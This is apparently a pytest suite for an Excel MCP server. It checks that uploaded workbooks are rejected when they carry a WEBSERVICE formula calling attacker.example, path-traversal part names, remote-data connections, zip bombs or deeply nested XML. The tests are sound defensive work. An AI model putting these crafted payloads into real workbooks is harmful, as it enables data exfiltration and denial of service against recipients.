import base64
import io
import sys
import tracemalloc
import warnings
import zipfile
from pathlib import Path

import pytest
from openpyxl import Workbook

from excel_mcp.config import Limits
from excel_mcp.errors import ExcelMCPError
from excel_mcp.operations.files import decode_workbook
from excel_mcp.package import scan_package
from tests.conftest import ToolCall

ATTACK = 'WEBSERVICE("https://attacker.example")'
pytestmark = pytest.mark.anyio
LIMITS = Limits()


def _base() -> dict[str, bytes]:
    buffer = io.BytesIO()
    Workbook().save(buffer)
    with zipfile.ZipFile(buffer) as archive:
        return {name: archive.read(name) for name in archive.namelist()}


def _package(
    extra: list[tuple[str, bytes]] | None = None, replace: dict[str, bytes] | None = None
) -> bytes:
    parts = {**_base(), **(replace or {})}
    buffer = io.BytesIO()
    with (
        zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive,
        warnings.catch_warnings(),
    ):
        warnings.simplefilter("ignore")  # duplicate names are the point of some tests
        for name, content in [*parts.items(), *(extra or [])]:
            archive.writestr(name, content)
    return buffer.getvalue()


def _decode(content: bytes, limits: Limits = LIMITS) -> bytes:
    return decode_workbook(base64.b64encode(content).decode(), limits)


def _rejected(content: bytes, limits: Limits = LIMITS) -> str:
    with pytest.raises(ExcelMCPError) as caught:
        _decode(content, limits)
    return str(caught.value)


def test_a_plain_workbook_is_accepted() -> None:
    _decode(_package())


@pytest.mark.parametrize(
    "name",
    ["customXml/item1.dat", "docProps/notes.TXT", "xl/media/pic.png", "other.xmL", "Sheet"],
)
def test_formulas_are_found_in_xml_parts_whatever_they_are_called(name: str) -> None:
    sheet = f"<worksheet><sheetData><row><c><f>{ATTACK}</f></c></row></sheetData></worksheet>"
    assert "not allowed" in _rejected(_package([(name, sheet.encode())]))


def test_formulas_are_found_in_utf16_xml_parts() -> None:
    sheet = f"<worksheet><f>{ATTACK}</f></worksheet>".encode("utf-16")
    assert "not allowed" in _rejected(_package([("misc/data.bin", sheet)]))


@pytest.mark.parametrize("name", ["../evil.xml", "/abs.xml", "C:/x.xml", "a/../../b.xml"])
def test_unsafe_part_names_are_rejected(name: str) -> None:
    assert "unsafe name" in _rejected(_package([(name, b"<a/>")]))


@pytest.mark.skipif(sys.platform == "win32", reason="zipfile turns backslashes into slashes")
def test_backslashes_in_part_names_are_rejected() -> None:
    content = _package([("xl_x.xml", b"<a/>")]).replace(b"xl_x.xml", b"xl\\x.xml")
    assert "unsafe name" in _rejected(content)


def test_duplicate_parts_are_rejected() -> None:
    assert "more than one part" in _rejected(_package([("xl/workbook.xml", b"<a/>")]))
    assert "more than one part" in _rejected(_package([("XL/Workbook.xml", b"<a/>")]))


@pytest.mark.parametrize(
    ("name", "content"),
    [
        ("xl/connections.xml", b'<connections xmlns="urn:x"/>'),
        ("elsewhere/c.bin", b"<connections/>"),
        ("xl/queryTables/queryTable1.xml", b"<queryTable/>"),
        ("xl/externalLinks/l.xml", b"<externalLink/>"),
    ],
)
def test_remote_data_parts_are_rejected(name: str, content: bytes) -> None:
    assert "fetch data" in _rejected(_package([(name, content)]))


def test_remote_data_content_types_and_relationships_are_rejected() -> None:
    types = _base()["[Content_Types].xml"].replace(
        b"</Types>",
        b'<Override PartName="/x/y.bin" ContentType="application/vnd.openxmlformats-'
        b'officedocument.spreadsheetml.connections+xml"/></Types>',
    )
    assert "fetch data" in _rejected(_package(replace={"[Content_Types].xml": types}))
    relationship = (
        b'<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        b'<Relationship Id="r1" Type="http://x/relationships/queryTable" Target="q.xml"/>'
        b"</Relationships>"
    )
    assert "fetch data" in _rejected(_package([("xl/_rels/other.rels", relationship)]))


def test_total_expansion_is_limited() -> None:
    limits = Limits(max_file_bytes=10_000, max_unpack_factor=2)
    content = _package([("docs/big.dat", b"1234567890" * 3000)])
    assert "expands to more than" in _rejected(content, limits)


def test_dense_compression_is_rejected() -> None:
    zeros = bytes(8 * 1024 * 1024)
    assert "compressed too densely" in _rejected(_package([("docs/zeros.dat", zeros)]))


class _Endless:
    def read(self, size: int) -> bytes:
        return b"<a>" * (size // 3)


def test_limits_are_enforced_while_reading_whatever_the_header_says() -> None:
    from excel_mcp.package import _Entry  # pyright: ignore[reportPrivateUsage]

    info = zipfile.ZipInfo("x.xml")
    info.compress_size = 10**9  # a header that hides the real size
    limits = Limits(max_file_bytes=1000, max_unpack_factor=1)
    entry = _Entry(_Endless(), info, limits, limits.max_unpacked_bytes)  # type: ignore[arg-type]
    with pytest.raises(ExcelMCPError, match="expands to more than"):
        entry.drain()


def test_deeply_nested_xml_is_rejected() -> None:
    deep = b"<a>" * 150 + b"</a>" * 150
    assert "nested too deeply" in _rejected(_package([("docs/deep.xml", deep)]))


def test_scanning_uses_constant_memory() -> None:
    rows = b"".join(b"<row><c><v>%d</v></c></row>" % number for number in range(300_000))
    sheet = b"<worksheet><sheetData>" + rows + b"</sheetData></worksheet>"
    content = _package([("docs/rows.xml", sheet)])
    tracemalloc.start()
    try:
        assert list(scan_package(content, LIMITS)) == []
        peak = tracemalloc.get_traced_memory()[1]
    finally:
        tracemalloc.stop()
    assert peak < 20 * 1024 * 1024


async def test_import_reports_unsafe_packages(call_error: ToolCall, files: Path) -> None:
    content = base64.b64encode(_package([("docs/c.bin", b"<connections/>")])).decode()
    message = await call_error("import_workbook", path="up.xlsx", content_base64=content)
    assert "fetch data" in message
    assert not (files / "up.xlsx").exists()
